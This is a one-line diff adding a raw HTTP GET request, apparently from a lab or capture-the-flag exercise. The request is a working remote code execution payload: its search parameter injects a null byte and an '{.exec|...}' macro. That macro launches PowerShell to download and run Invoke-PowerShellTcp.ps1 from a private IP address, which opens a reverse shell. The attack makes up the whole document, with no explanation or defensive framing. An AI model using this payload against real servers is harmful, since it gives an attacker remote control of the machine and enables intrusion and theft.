@@ -1,0 +1,1 @@
+GET /?search=%00{.exec|C:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell.exe  IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.63:8000/Invoke-PowerShellTcp.ps1').} HTTP/1.1
